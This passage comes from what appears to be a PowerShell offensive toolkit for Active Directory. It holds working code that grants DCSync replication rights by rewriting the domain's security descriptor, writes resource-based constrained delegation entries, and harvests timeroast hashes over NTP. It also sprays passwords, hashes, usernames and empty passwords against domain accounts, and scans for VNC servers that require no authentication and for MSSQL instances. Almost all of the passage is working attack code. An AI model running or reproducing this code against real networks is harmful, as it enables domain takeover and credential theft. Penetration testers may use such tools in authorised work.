                            $UserSidBytes = $UserEntry.Attributes["objectSid"][0]
                            $UserSid = New-Object System.Security.Principal.SecurityIdentifier($UserSidBytes, 0)
                    
                            $Result += "[*] User SID: $($UserSid.Value)`n"
                        }
                
                        catch { $Result += "[!] Error retrieving user SID: $_`n" ; return $Result }
        	
                        $DomainDN = ($ObjectToElevate -split ',' | Where-Object { $_ -like 'DC=*' }) -join ','
                        $Result += "[*] Domain DN: $DomainDN`n"
        	
                        # Retrieve domain's security descriptor
                        $Result += "[*] Retrieving security descriptor for domain $DomainDN`n"
                        $SearchDomainRequest = New-Object System.DirectoryServices.Protocols.SearchRequest($DomainDN, "(objectClass=*)", [System.DirectoryServices.Protocols.SearchScope]::Base, "nTSecurityDescriptor")
        	
                        $DomainResponse = $LdapConnection.SendRequest($SearchDomainRequest)
            	
                        if ($DomainResponse.ResultCode -ne [System.DirectoryServices.Protocols.ResultCode]::Success) { return "Failed to retrieve domain security descriptor: $($DomainResponse.ResultCode)" }
        	
                        $DomainEntry = $DomainResponse.Entries[0]
                        $SdBytes = $DomainEntry.Attributes["nTSecurityDescriptor"][0]
                        $Sd = New-Object System.Security.AccessControl.RawSecurityDescriptor($SdBytes, 0)
        	
                        $Result += "[*] Retrieved current security descriptor`n"
                    }
                
                    catch { $Result += "[!] Error: retrieving domain security descriptor: $_`n" ; return $Result }
        	
                    # Define DCSync GUIDs
                    $GetChangesGuid = [Guid]"1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"
                    $GetChangesAllGuid = [Guid]"1131f6ad-9c07-11d1-f79f-00c04fc2dcd2"
        	
                    # Create ACEs
                    $Ace1 = New-Object System.Security.AccessControl.ObjectAce(
                        [System.Security.AccessControl.AceFlags]::None,
                        [System.Security.AccessControl.AceQualifier]::AccessAllowed,
                        0x100,
                        $UserSid,
                        [System.Security.AccessControl.ObjectAceFlags]::ObjectAceTypePresent,
                        $GetChangesGuid,
                        [Guid]::Empty,
                        $false,
                        $null
                    )
        	
                    $Ace2 = New-Object System.Security.AccessControl.ObjectAce(
                        [System.Security.AccessControl.AceFlags]::None,
                        [System.Security.AccessControl.AceQualifier]::AccessAllowed,
                        0x100,
                        $UserSid,
                        [System.Security.AccessControl.ObjectAceFlags]::ObjectAceTypePresent,
                        $GetChangesAllGuid,
                        [Guid]::Empty,
                        $false,
                        $null
                    )
        	
                    # Add ACEs to DACL
                    $Sd.DiscretionaryAcl.InsertAce(0, $Ace1)
                    $Sd.DiscretionaryAcl.InsertAce(0, $Ace2)
            	
                    $Result += "[*] Added DCSync ACEs to security descriptor`n"
        	
                    # Convert security descriptor to byte array
                    $NewSd = New-Object byte[] $Sd.BinaryLength
                    $Sd.GetBinaryForm($NewSd, 0)
        	
                    $ModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest($DomainDN, [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace, "nTSecurityDescriptor", $NewSd)
        	
                    #Write-Output "[*] Attempting to modify domain security descriptor"
                    $ModifyResponse = $LdapConnection.SendRequest($ModifyRequest)
                    
                    if ($ModifyResponse.ResultCode -ne [System.DirectoryServices.Protocols.ResultCode]::Success) { return "[!] Failed to modify security descriptor: $($ModifyResponse.ResultCode)" }
                    else { $Result += "[+] Successfully granted DCSync rights to $ObjectToElevate`n" ; return $Result }
                
                
                }

                elseif ($Module -eq "AddRBCD") {
        
        
                    try {
                
                        $SearchRequest = New-Object System.DirectoryServices.Protocols.SearchRequest($TargetDN, "(objectClass=*)", [System.DirectoryServices.Protocols.SearchScope]::Base, "msDS-AllowedToActOnBehalfOfOtherIdentity")
                        $SearchResponse = $LdapConnection.SendRequest($SearchRequest)
        
                        if ($SearchResponse.Entries.Count -gt 0 -and $SearchResponse.Entries[0].Attributes["msDS-AllowedToActOnBehalfOfOtherIdentity"]) {
                            return "Value msDS-AllowedToActOnBehalfOfOtherIdentity already exists. Use -Module RemoveRBCD to clear the value first"
                        }
                
                        $Rsd = New-Object Security.AccessControl.RawSecurityDescriptor("O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$SID)")
                        $Rsdb = New-Object byte[] ($Rsd.BinaryLength)
                        $Rsd.GetBinaryForm($Rsdb, 0)
        
                        $Modification = New-Object System.DirectoryServices.Protocols.DirectoryAttributeModification
                        $Modification.Name = "msDS-AllowedToActOnBehalfOfOtherIdentity"
                        $Modification.Add($Rsdb) > $null
                        $Modification.Operation = [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace
        	
                        $ModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest($TargetDN, $Modification)
        
                        try {
                            $LdapConnection.SendRequest($ModifyRequest) > $null
                            return "[+] msDS-AllowedToActOnBehalfOfOtherIdentity successfully added on ""$TargetDN"" for SID: $SID"
                        }
                
                        catch { return "Error: $_" }
                    }
            
                    catch { return "Error: $_" }
                }

                elseif ($Module -eq "RemoveRBCD") {

                    $Modification = New-Object System.DirectoryServices.Protocols.DirectoryAttributeModification
                    $Modification.Name = "msDS-AllowedToActOnBehalfOfOtherIdentity"
                    $Modification.Operation = [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Delete
                    $ModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest($TargetDN, $Modification)
            	
                    $LdapConnection.SendRequest($ModifyRequest) > $null
                    return "[+] msDS-AllowedToActOnBehalfOfOtherIdentity Removed from $TargetDN"
                }

                elseif ($Module -eq "timeroast") {

                    Function Invoke-AuthenticatedTimeRoast {

                        param(
                            [Parameter(Mandatory = $true)]
                            [string]$DomainController,
                            [int]$Rate = 180,
                            [int]$Timeout = 24
                        )

                        $ErrorActionPreference = "Stop"
                        $NtpPrefix = [byte[]]@(0xdb, 0x00, 0x11, 0xe9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xe1, 0xb8, 0x40, 0x7d, 0xeb, 0xc7, 0xe5, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xe1, 0xb8, 0x42, 0x8b, 0xff, 0xbf, 0xcd, 0x0a)

                        $Client = New-Object System.Net.Sockets.UdpClient
                        $Client.Client.ReceiveTimeout = [Math]::Floor(1000 / $Rate)
                        $Client.Connect($DomainController, 123)

                        function Get-ComputerRids {
                            param([string]$DomainController)

                            $Searcher = New-Object System.DirectoryServices.DirectorySearcher
                            $Searcher.SearchRoot = "LDAP://$DomainController"
                            $Searcher.Filter = "(&(objectCategory=computer))"
                            $Searcher.PageSize = 1000
                            $Searcher.PropertiesToLoad.AddRange(@("sAMAccountName", "objectSID"))

                            $Computers = @()
                            
                            foreach ($Result in $Searcher.FindAll()) {
            
                                try {
                
                                    $SamAccountName = $Result.Properties["sAMAccountName"][0]
                                    $Sid = New-Object System.Security.Principal.SecurityIdentifier($Result.Properties["objectsid"][0], 0)
                                    $Rid = [int]$Sid.Value.Split("-")[-1]

                                    $Computers += [PSCustomObject]@{
                                        Name = $SamAccountName
                                        RID  = $Rid
                                    }
                                }
            
                                catch { continue }
                            }

                            return $Computers
                        }

                        $Computers = Get-ComputerRids -DomainController $DomainController
                        $TimeoutTime = (Get-Date).AddSeconds($Timeout)

                        $WordlistPath = "$Timeroast\.Wordlist.txt"
                        Remove-item $WordlistPath -force -ErrorAction "SilentlyContinue"

                        foreach ($Computer in $Computers) {
            
                            $Name = $Computer.Name.TrimEnd('$').ToLower()
                            $Name | Out-File -Append -FilePath $WordlistPath -Encoding "ascii"
        
                        }

                        foreach ($Computer in $Computers) {
                            
                            $Rid = $Computer.RID
                            $Query = $NtpPrefix + [BitConverter]::GetBytes($Rid) + [byte[]]::new(16)

                            [void] $Client.Send($Query, $Query.Length)

                            try {
                                
                                $Reply = $Client.Receive([ref]$null)

                                if ($Reply.Length -eq 68) {
                
                                    $Salt = [byte[]]$Reply[0..47]
                                    $Md5Hash = [byte[]]$Reply[-16..-1]
                                    $AnswerRid = [BitConverter]::ToUInt32($Reply[-20..-16], 0)

                                    $HexSalt = [BitConverter]::ToString($Salt).Replace("-", "").ToLower()
                                    $HexHash = [BitConverter]::ToString($Md5Hash).Replace("-", "").ToLower()
                
                                    $ComputerHostname = $Computer.Name.TrimEnd('$')
                                    $HashcatHash = "$ComputerHostname`:`$sntp-ms`${0}`${1}" -f $HexHash, $HexSalt

                                    Write-Output $HashcatHash
                                    $TimeoutTime = (Get-Date).AddSeconds($Timeout)
                                
                                }
                            }
        
                            catch { continue }
                        }

                        return $Result
                        $Client.Close()
                    }

                    $Timestamp = Get-Date -Format o | ForEach-Object { $_ -replace ":", "." }

                    if ($ShowOutput) {
                    
                        return Invoke-AuthenticatedTimeRoast -DomainController $ComputerName  | Out-string | Sort-Object | Tee-Object "$Timeroast\$Timestamp.txt"

                    }

                    else {
                     
                        return Invoke-AuthenticatedTimeRoast -DomainController $ComputerName  | Out-string | Sort-Object | Out-File "$Timeroast\$Timestamp.txt"

                    }

                } 
            }
            
            catch { return "Error: $_" }
            finally { if ($LdapConnection) { $LdapConnection.Dispose() } }
        }


        foreach ($computer in [array]$Computers) {

            if (!$IPAddress) {
                $ComputerName = $computer.Properties["dnshostname"][0]
                $OS = $computer.Properties["operatingSystem"][0]
            }

            elseif ($IPAddress) {
                $ComputerName = "$Computer"
                $OS = "OS:PLACEHOLDER"
            }

            $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($ComputerName).AddArgument($Command).AddArgument($Username).AddArgument($Password).AddArgument($LocalAuth).AddArgument($Timeout).AddArgument($Module).AddArgument($TargetDN).AddArgument($GroupDN).AddArgument($SID).AddArgument($LDAPS).AddArgument($Timeroast).AddArgument($ShowOutput)
            $runspace.RunspacePool = $runspacePool

            [void]$runspaces.Add([PSCustomObject]@{
                    Runspace     = $runspace
                    Handle       = $runspace.BeginInvoke()
                    ComputerName = $ComputerName
                    OS           = $OS
                    Completed    = $false
                })
        }


        do {
            foreach ($runspace in $runspaces | Where-Object { -not $_.Completed }) {

                if ($runspace.Handle.IsCompleted) {
                    
                    $runspace.Completed = $true
                    $result = $null
                    $result = $runspace.Runspace.EndInvoke($runspace.Handle)[0]
                    $Cleanup = $runspace.Runspace.EndInvoke($runspace.Handle)[1]
                    $Class = $runspace.Runspace.EndInvoke($runspace.Handle)[2]
                    $hasDisplayedResult = $false
                    
                    try {
                        # remove later?
                        #$result = $result.Trim()
                    }
                    
                    catch {}

                    if ($result -eq "Unable to connect") { continue }

                    if ($result -like "Error:*") {

                        $Global:SuccessCount++
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText $result -NameLength $NameLength -OSLength $OSLength
                        continue

                    }

                    else {
                    
                        $Global:SuccessCount++
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength

                        ""
                        $result | Write-Output

                    }


                    # Dispose of runspace and close handle
                    $runspace.Runspace.Dispose()
                    $runspace.Handle.AsyncWaitHandle.Close()
                }
            }

            Start-Sleep -Milliseconds 100
        } while ($runspaces | Where-Object { -not $_.Completed })


        $runspacePool.Close()
        $runspacePool.Dispose()
    }


    ################################################################################################################
    ################################################## Function: Spray #############################################
    ################################################################################################################
    Function Method-Spray {
        
        Write-host

        # Create a directory entry for the specified domain
        $directoryEntry = [ADSI]"LDAP://$domain"
        $searcher = New-Object System.DirectoryServices.DirectorySearcher($directoryEntry)
        $searcher.PropertiesToLoad.AddRange(@("lockoutThreshold"))

        # Set the filter to query the domainDNS object
        $searcher.Filter = "(objectClass=domainDNS)"
        $domainObject = $searcher.FindOne()

        if ($domainObject.Properties.Contains("lockoutThreshold")) {
            $lockoutThreshold = $domainObject.Properties["lockoutThreshold"][0]
            # Check the lockout threshold value
            $LO_threshold = $lockoutThreshold

            if ($LO_threshold -eq "0") {
                $SafeLimit = 100000
            }
            elseif ($LO_threshold -lt 3) {
                Write-Host
                Write-Host "[-] " -ForegroundColor "Red" -NoNewline
                Write-Host "Lockout threshold is 2 or less. Aborting..."
                return
            }
            elseif ($LO_threshold -lt 4) {
                $SafeLimit = 1
            }
            else {
                $SafeLimit = $LO_threshold - 2
            }
        }
        else {
            
            Write-Host
            Write-Host "[-] " -ForegroundColor "Red" -NoNewline
            Write-Host "Threshold not found. Aborting..."
            return
        }
        
        # gut this out and replace with the new function
        $searcher = New-Object System.DirectoryServices.DirectorySearcher($directoryEntry)

        # Display the $SafeLimit value
        Write-Output " - Lockout Threshold  : $LO_threshold"
        Write-Output " - Safety Limit value : $SafeLimit"
        Write-Output " - Removed disabled accounts from spraying"

        if ($SprayHash -ne "") {
            Write-Host
            $SprayPassword = ""
            $AccountAsPassword = $False

            if ($SprayHash.Length -ne 32 -and $SprayHash.Length -ne 64 -and $SprayHash.Length -ne 65) {
                Write-Host "[-] " -ForegroundColor "Red" -NoNewline
                Write-Host "Supply either a 32-character RC4/NT hash, 64-character AES256 hash or a NTLM hash"
                Write-Host 
                return
            }

            Write-Host
            Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
            Write-Host "Spraying with Hash value: $SprayHash"
            if ($SprayHash.Length -eq 64) {
            
                Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                Write-Host "AES hashes are salted and unlikely to be valid for more than a single account"
            
            }
            
            Write-Host

        }

        if ($Pre2k) {          
            $SprayHash = ""
            $SprayPassword = ""
            $AccountAsPassword = $False

            Write-Host
            Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
            Write-Host "Spraying for Pre2k accounts."
            Write-Host

        }

        if ($SprayPassword -ne "") {
            $SprayHash = ""
            $AccountAsPassword = $False

            Write-Host
            Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
            Write-Host "Spraying with password value: $SprayPassword"
            Write-Host

        }

        if ($AccountAsPassword) {
            $SprayHash = ""
            $SprayPassword = ""

            Write-Host
            Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
            Write-Host "Spraying usernames as passwords"
            Write-Host
        }

        if ($EmptyPassword) {
            $SprayPassword = ""
            $SprayHash = ""
            $AccountAsPassword = $False     
    
            Write-Host
            Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
            Write-Host "Spraying empty passwords"
            Write-Host
        }

        
        $SuccessUsers = @()
        
        # Add Bloodhound queries to this at a later date
        if ($Pre2k) {
        Write-Host

            foreach ($Computer in $ComputerSamAccounts) {

                $Pre2kName = $Computer.ToString()
                $Pre2kName = $Pre2kName.Trim('$').ToLower()
                $Attempt = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$Domain", "$Domain\$Pre2kName", "$Pre2kName")
        
                if ($Attempt.name -ne $null) {
                    Write-Host "[+] " -ForegroundColor "Green" -NoNewline
                    Write-Host "$Domain\$Pre2kName"
                        
                    $SuccessfulUser = "$Domain\$Pre2kName"
                    $SuccessUsers += $SuccessfulUser
                        
                    "$Domain\${Pre2kName}:$Pre2kName" | Out-file -FilePath "$Spraying\$Domain-Pre2k.txt" -Encoding "Unicode" -Append
                }

                elseif (!$SuccessOnly) {
                    Write-Host "[-] " -ForegroundColor "Red" -NoNewline
                    Write-Host "$Domain\$Pre2kName"
                }

            }

            if ("$Spraying\$Domain-Pre2k.txt"){

                (Get-Content "$Spraying\$Domain-Pre2k.txt" -ErrorAction "SilentlyContinue" | Where-Object { $_.Trim() -ne "" } | Sort-Object -Unique) | Set-Content "$Spraying\$Domain-Pre2k.txt" -Force

            } 

        }

        else {
        
            foreach ($UserToSpray in $EnabledDomainUsers) {
                $Delay = Get-Random -Minimum 5 -Maximum 20
                Start-Sleep -Milliseconds $Delay

                Write-Log -Message  "Querying user $UserToSpray from LDAP"

                try {
                    $searcher.Filter = "(&(objectCategory=person)(objectClass=user)(samAccountName=$UserToSpray))"
                    $searchResult = $searcher.FindOne()
                    $badPwdCount = $searchResult.Properties["badPwdCount"][0]  

                    if ($badPwdCount -ge $SafeLimit) {
                        if (!$SuccessOnly) {
                            Write-Host "[/] " -ForegroundColor "Magenta" -NoNewline
                            Write-Host "$Domain\$UserToSpray - Safe threshold met"
                            continue
                        }
                    }
                    # Hash Spraying
                    if ($SprayHash -ne "") {
                        if ($SprayHash.Length -eq 32) { $Attempt = Invoke-rTickets ticketreq /user:$UserToSpray /rc4:$SprayHash /domain:$domain /force /opsec | Out-String }
                        elseif ($SprayHash.Length -eq 64) { $Attempt = Invoke-rTickets ticketreq /user:$UserToSpray /aes256:$SprayHash /domain:$domain /enctype:aes256 | Out-String }
                        elseif ($SprayHash.Length -eq 65) {
                            $colonCount = ($SprayHash.ToCharArray() | Where-Object { $_ -eq ':' }).Count
                            if ($colonCount -ne 1) {
                                Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                                Write-Host "Ensure the provided value for the NTLM hash is formed as LM:NT"
                                Write-Host "Example: aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe"
                                break
                            }
                    
                            $SprayHash = $SprayHash.Split(':')[1]
                            $Attempt = Invoke-rTickets ticketreq /user:$UserToSpray /rc4:$SprayHash /domain:$domain /force /opsec | Out-String
                        }

                        # Check for Unhandled exception
                        if ($Attempt.IndexOf("Unhandled rTickets exception:") -ne -1) {
                            if (!$SuccessOnly) {
                                Write-Host "[-] " -ForegroundColor "Red" -NoNewline
                                Write-Host "$Domain\$UserToSpray"
                            }    
                        } 
                        # Check for KDC_ERR_PREAUTH_FAILED
                        elseif ($Attempt.IndexOf("KDC_ERR_PREAUTH_FAILED") -ne -1) {
                            if (!$SuccessOnly) {
                                Write-Host "[-] " -ForegroundColor "Red" -NoNewline
                                Write-Host "$Domain\$UserToSpray"
                            }   
                        }
					
                        # Check for RC4 Errors
                        elseif ($Attempt.IndexOf("NOTSUPP") -ne -1) {
                            Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                            Write-Host "$Domain\$UserToSpray - RC4 type not supported"
                        }
					
                        # Check for a value that only appears in a success status
                        elseif ($Attempt.IndexOf("NameService              :") -ne -1) {
                            Write-Host "[+] " -ForegroundColor "Green" -NoNewline
                            Write-Host "$Domain\$UserToSpray"

                            $SuccessfulUser = "$Domain\$UserToSpray"
                            $SuccessUsers += $SuccessfulUser
                        
                            "$Domain\${UserToSpray}:$SprayHash" | Out-file -FilePath "$Spraying\$Domain-Hashes-Users.txt" -Encoding "ASCII" -Append
                            Append-BHQuery -Username $UserToSpray -Domain $Domain -UserOwned
                            if ($SprayHash.Length -eq 64) { Append-BHQuery -Username $UserToSpray -Domain $Domain -AES256 $SprayHash -AESProperty }
                            elseif ($SprayHash.Length -eq 32) { Append-BHQuery -Username $UserToSpray -Domain $Domain -RC4 $SprayHash -RC4Property }
                        
                        }
                    }

                    # Password Spraying
                    if ($SprayPassword -ne "") {
                    
                    
                        $Attempt = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$Domain", "$Domain\$UserToSpray", "$SprayPassword")
        
                        if ($Attempt.name -ne $null) {
                            Write-Host "[+] " -ForegroundColor "Green" -NoNewline
                            Write-Host "$Domain\$UserToSpray"
                        
                            $SuccessfulUser = "$Domain\$UserToSpray"
                            $SuccessUsers += $SuccessfulUser
                        
                            "$Domain\${UserToSpray}:$SprayPassword" | Out-file -FilePath "$Spraying\$Domain-Password-Users.txt" -Encoding "ASCII" -Append
                            Append-BHQuery -Username $UserToSpray -Domain $Domain
                            Append-BHQuery -Username $UserToSpray -Domain $Domain -Password $SprayPassword -PasswordProperty
                        }

                        elseif (!$SuccessOnly) {
                            Write-Host "[-] " -ForegroundColor "Red" -NoNewline
                            Write-Host "$Domain\$UserToSpray"
                        }
                    }
                    # Account as password
                    if ($AccountAsPassword) {

                        $Attempt = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$Domain", "$Domain\$UserToSpray", "$UserToSpray")
        
                        if ($Attempt.name -ne $null) {
                            Write-Host "[+] " -ForegroundColor "Green" -NoNewline
                            Write-Host "$Domain\$UserToSpray"
                        
                            $SuccessfulUser = "$Domain\$UserToSpray"
                            $SuccessUsers += $SuccessfulUser
                        
                            "$Domain\${UserToSpray}:$UserToSpray" | Out-file -FilePath "$Spraying\$Domain-AccountAsPassword-Users.txt" -Encoding "ASCII" -Append
                            Append-BHQuery -Username $UserToSpray -Domain $Domain -UserOwned
                            Append-BHQuery -Username $UserToSpray -Domain $Domain -Password $UserToSpray -PasswordProperty
                        }

                        elseif (!$SuccessOnly) {
                            Write-Host "[-] " -ForegroundColor "Red" -NoNewline
                            Write-Host "$Domain\$UserToSpray"
                        }
    
                    }

                    # EmptyPasswords
                    if ($EmptyPassword) {
                        $SprayPassword = ""
       
                        $Attempt = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$Domain", "$Domain\$UserToSpray", "$SprayPassword")
        
                        if ($Attempt.name -ne $null) {
                            Write-Host "[+] " -ForegroundColor "Green" -NoNewline
                            Write-Host "$Domain\$UserToSpray"
                        
                            $SuccessfulUser = "$Domain\$UserToSpray"
                            $SuccessUsers += $SuccessfulUser
                        
                            "$Domain\${UserToSpray}" | Out-file -FilePath "$Spraying\$Domain-EmptyPassword-Users.txt" -Encoding "ASCII" -Append
                            Append-BHQuery -Username $UserToSpray -Domain $Domain -Password "Empty Password" -PasswordProperty
                        }

                        elseif (!$SuccessOnly) {
                            Write-Host "[-] " -ForegroundColor "Red" -NoNewline
                            Write-Host "$Domain\$UserToSpray"
                        }
                    }
                }
                catch {
        
                    Write-Host "[-] " -ForegroundColor "Red" -NoNewline
                    Write-Host "$Domain\$UserToSpray - Exception occurred: $($_.Exception.Message)"
        
                }
            }

        }

        
        if ($SuccessUsers.Count -gt 0 ) {
            Write-Host
            Write-Host
            Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
            Write-Host "Valid credential pairs `n " -NoNewline
            if (!$SuccessOnly) { Write-Host } Else {}

            if (!$SuccessOnly) {
                foreach ($User in $SuccessUsers) {
                    Write-Host "[+] " -ForegroundColor "Green" -NoNewline
                    Write-Host "$User"
                
                }
            }
            
            if (!$SuccessOnly) { Write-Host } Else {}
            Write-Host "[*] " -ForegroundColor "Yellow" -no
            Write-Host "Output written to $Spraying"
            Write-Host
        }

        elseif ($SuccessUsers.Count -eq 0 ) {
            Write-Host
            Write-Host
            Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
            Write-Host "No valid credential pairs found"
            Write-Host
        }
 
        if (Test-Path "$Spraying\$Domain-EmptyPassword-Users.txt") {
            $Unique = Get-Content "$Spraying\$Domain-EmptyPassword-Users.txt" -Verbose | Sort-Object -Unique
            $Unique | Set-Content "$Spraying\$Domain-EmptyPassword-Users.txt" -Force
            
        }

        if (Test-Path "$Spraying\$Domain-AccountAsPassword-Users.txt") {
            $Unique = Get-Content "$Spraying\$Domain-AccountAsPassword-Users.txt" -Verbose | Sort-Object -Unique
            $Unique | Set-Content "$Spraying\$Domain-AccountAsPassword-Users.txt" -Force
            
        }

        if (Test-Path "$Spraying\$Domain-Password-Users.txt") {
            $Unique = Get-Content "$Spraying\$Domain-Password-Users.txt" -Verbose | Sort-Object -Unique
            $Unique | Set-Content "$Spraying\$Domain-Password-Users.txt" -Force
            
        }

        if (Test-Path "$Spraying\$Domain-Hashes-Users.txt") {
            $Unique = Get-Content "$Spraying\$Domain-Hashes-Users.txt" -Verbose | Sort-Object -Unique
            $Unique | Set-Content "$Spraying\$Domain-Hashes-Users.txt"
            
        }

        [int]$SuccessUsersInt = $SuccessUsers.Count
        if ($SuccessUsers -gt 0 ) { [int]$Global:SuccessCount = [int]$SuccessUsersInt }
        else { $Global:SuccessCount = 0 }
 
    }

    ################################################################################################################
    ################################################## Function: VNC ###############################################
    ################################################################################################################
    Function Method-VNC {

        if ($Port -eq "") { $Port = "5900" } else { $Port = $Port }

        # Create a runspace pool
        $runspacePool = [runspacefactory]::CreateRunspacePool(1, $Threads)
        $runspacePool.Open()
        $runspaces = New-Object System.Collections.ArrayList

        $scriptBlock = {
            param ($ComputerName, $Port, $Timeout)

            $tcpClient = New-Object System.Net.Sockets.TcpClient
            $asyncResult = $tcpClient.BeginConnect($ComputerName, $Port, $null, $null)
            $wait = $asyncResult.AsyncWaitHandle.WaitOne($Timeout) 

            if ($wait) { 
                try {
                    $tcpClient.EndConnect($asyncResult)
                    $connected = $true
                }
                catch {
                    $connected = $false
                }
            }
            else {
                $connected = $false
            }

            if (!$connected) { $tcpClient.Close() ; return }

            function VNC-NoAuth {
                param(
                    [string]$ComputerName,
                    [int]$Port
                )
                try {
                    $tcpClient = New-Object System.Net.Sockets.TcpClient($ComputerName, $Port)
                }
                catch {
                    Write-Host "Error: Unable to connect to $ComputerName on port $Port"
                    return "Connection Error"
                }

                try {
                    $networkStream = $tcpClient.GetStream()
                    $networkStream.ReadTimeout = 50
        
                    # Reading Version from Server
                    $buffer = New-Object byte[] 12
                    $read = $networkStream.Read($buffer, 0, 12)
                    if ($read -eq 0) { throw "No data received from the server" }
                    $serverVersionMessage = [System.Text.Encoding]::ASCII.GetString($buffer, 0, $read)
        
                    # Sending Client Version
                    $buffer = [System.Text.Encoding]::ASCII.GetBytes($serverVersionMessage)
                    $networkStream.Write($buffer, 0, $buffer.Length)

                    # Reading Supported Security Types
                    $buffer = New-Object byte[] 2
                    $read = $networkStream.Read($buffer, 0, 1)
                    if ($read -eq 0) { throw "No data received from the server" }
                    $numberOfSecTypes = $buffer[0]
                    $buffer = New-Object byte[] $numberOfSecTypes
                    $read = $networkStream.Read($buffer, 0, $numberOfSecTypes)
                    if ($read -eq 0) { throw "No data received from the server" }
                }
                catch {
                    Write-Host "Error: Handshake failed with $ComputerName on port $Port"
                    return "Handshake Error"
                }
                finally {
                    # Cleanup
                    if ($null -ne $networkStream) { $networkStream.Close() }
                    if ($null -ne $tcpClient) { $tcpClient.Close() }
                }

                # Check for Non-authentication (Type 1)
                if ($buffer -contains 1) {
                    return "Supported"
                }
                else {
                    return "Not Supported"
                }
            }

            $AuthSupported = VNC-NoAuth -ComputerName $ComputerName -Port $Port
            return "$AuthSupported"
        }

        # Create and invoke runspaces for each computer
        foreach ($computer in [array]$Computers) {

            if (!$IPAddress) {
                $ComputerName = $computer.Properties["dnshostname"][0]
                $OS = $computer.Properties["operatingSystem"][0]
            }

            elseif ($IPAddress) {
                $ComputerName = "$Computer"
                $OS = "OS:PLACEHOLDER"
            }
    
            $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($ComputerName).AddArgument($Port).AddArgument($Timeout)
            $runspace.RunspacePool = $runspacePool

            [void]$runspaces.Add([PSCustomObject]@{
                    Runspace     = $runspace
                    Handle       = $runspace.BeginInvoke()
                    ComputerName = $ComputerName
                    OS           = $OS
                    Completed    = $false
                })
        }

        [int]$Global:SuccessCount = 0
        do {
            foreach ($runspace in $runspaces | Where-Object { -not $_.Completed }) {
        
                if ($runspace.Handle.IsCompleted) {
                    $runspace.Completed = $true
                    $result = $runspace.Runspace.EndInvoke($runspace.Handle)

                    if ($result -eq "Not Supported") {
                        if ($successOnly) { continue }
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Red" -statusSymbol "[-] " -statusText "AUTH REQUIRED" -NameLength $NameLength -OSLength $OSLength
                        continue
                    } 

                    if ($result -eq "Handshake Error") {
                        if ($successOnly) { continue }
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "HANDSHAKE ERROR" -NameLength $NameLength -OSLength $OSLength
                        continue
                    } 
                    elseif ($result -eq "Supported") {
                        $SuccessCount++
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "AUTH NOT REQUIRED" -NameLength $NameLength -OSLength $OSLength
                        $($runspace.ComputerName) | Out-File -FilePath "$VNC\.VNC-Non-Auth.txt" -Encoding "ASCII" -Append
                    } 

                    # Dispose of runspace and close handle
                    $runspace.Runspace.Dispose()
                    $runspace.Handle.AsyncWaitHandle.Close()
                }
            }

            Start-Sleep -Milliseconds 100
        } while ($runspaces | Where-Object { -not $_.Completed })

        Get-Content -Path "$VNC\.VNC-Non-Auth.txt" -ErrorAction "SilentlyContinue" | Sort-Object | Get-Unique | Set-Content -Path "$VNC\.VNC-Non-Auth.txt" -ErrorAction "SilentlyContinue"

        $runspacePool.Close()
        $runspacePool.Dispose()

    }

    ################################################################################################################
    ################################################## Function: MSSQL #############################################
    ################################################################################################################
    Function Method-MSSQL {

        Add-Type -AssemblyName "System.Data"

        # Create a runspace pool
        $runspacePool = [runspacefactory]::CreateRunspacePool(1, $Threads)
        $runspacePool.Open()
        $runspaces = New-Object System.Collections.ArrayList

        $scriptBlock = {
            param ($ComputerName, $MSSQL, $IPAddress)

            function Send-UdpDatagram {
                param ([string]$ComputerName)

                $client = New-Object net.sockets.udpclient(0)
                $client.Client.ReceiveTimeout = 100

                $send = [Byte] 0x03
                try { [void] $client.send($send, $send.length, $ComputerName, 1434) }
                Catch { return "Unable to connect" }

                $ipep = New-Object net.ipendpoint([net.ipaddress]::any, 0)
                $receive = $null
                try {
                    $receive = $client.receive([ref]$ipep)
                }
                catch [System.Net.Sockets.SocketException] { return "Unable to connect" } 
                finally {
                    try { $client.close() } Catch {}
                }

                $rawData = [text.encoding]::ascii.getstring($receive)
                $instanceFullNames = @()

                $rawData -split ';;' | ForEach-Object {
                    if ($_ -match 'InstanceName;([^;]+)') {
                        $instanceName = $matches[1]
                        $instanceFullNames += "$ComputerName\$instanceName"
                    }
                }

                $instanceFullNames
            }

